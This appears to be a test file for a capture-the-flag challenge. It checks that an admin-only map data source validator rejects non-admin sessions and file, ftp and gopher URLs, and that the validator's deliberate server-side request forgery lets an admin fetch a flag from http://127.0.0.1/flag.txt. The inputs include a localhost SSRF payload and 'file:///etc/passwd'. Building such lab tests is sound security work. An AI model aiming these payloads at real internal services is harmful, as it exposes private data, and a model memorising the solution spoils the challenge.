import { test, describe } from 'node:test';
import { strict as assert } from 'node:assert';
import {
  loginAsUser, postWithSession, postWithAdminSession, BASE_URL
} from './helpers';
import fetch from 'node-fetch';

const ADMIN_TOKEN = process.env.ADMIN_SESSION_TOKEN ?? '';

describe('SSRF — Map Data Source Validator', () => {

  test('customer session cannot access SSRF endpoint', async () => {
    const session = await loginAsUser();
    const res = await postWithSession(
      '/admin/tools/validate',
      { url: 'http://127.0.0.1/flag.txt' },
      session
    );
    assert.equal(res.status, 403, 'Customer must be rejected');
  });

  test('no session cannot access SSRF endpoint', async () => {
    const res = await fetch(`${BASE_URL}/admin/tools/validate`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ url: 'http://127.0.0.1/flag.txt' }),
    });
    assert.equal(res.status, 403);
  });

  test('SSRF endpoint rejects non-http(s) schemes', async () => {
    if (!ADMIN_TOKEN) { console.log('    ADMIN_SESSION_TOKEN not set — skipping'); return; }

    for (const badUrl of ['file:///etc/passwd', 'ftp://host/file', 'gopher://host/']) {
      const res = await postWithAdminSession(
        '/admin/tools/validate',
        { url: badUrl },
        ADMIN_TOKEN
      );
      const data = await res.json() as { error?: string };
      assert.ok(
        res.status === 400 || (res.status === 200 && data.error !== undefined),
        `Should reject scheme: ${badUrl}`
      );
    }
  });

  test('admin session can reach flag server via SSRF (http://127.0.0.1/flag.txt)', async () => {
    if (!ADMIN_TOKEN) { console.log('    ADMIN_SESSION_TOKEN not set — skipping'); return; }

    const res = await postWithAdminSession(
      '/admin/tools/validate',
      { url: 'http://127.0.0.1/flag.txt' },
      ADMIN_TOKEN
    );
    assert.equal(res.status, 200);
    const data = await res.json() as { status?: string; body?: string; statusCode?: number };
    assert.equal(data.status, 'ok', 'SSRF request to flag server should succeed');
    assert.ok(data.body?.includes('IGT{'), 'Body should contain flag');
  });

  test('full SSRF flag retrieval via admin session', async () => {
    if (!ADMIN_TOKEN) { console.log('    ADMIN_SESSION_TOKEN not set — skipping'); return; }

    const res = await postWithAdminSession(
      '/admin/tools/validate',
      { url: 'http://127.0.0.1/flag.txt' },
      ADMIN_TOKEN
    );
    const data = await res.json() as { status?: string; body?: string };
    assert.equal(data.status, 'ok');

    const body  = data.body ?? '';
    const match = body.match(/IGT\{[^}]+\}/);
    assert.ok(match, `Flag pattern not found in response body. Got: ${body.slice(0, 200)}`);
    console.log(`    Flag: ${match![0]}`);
  });

});
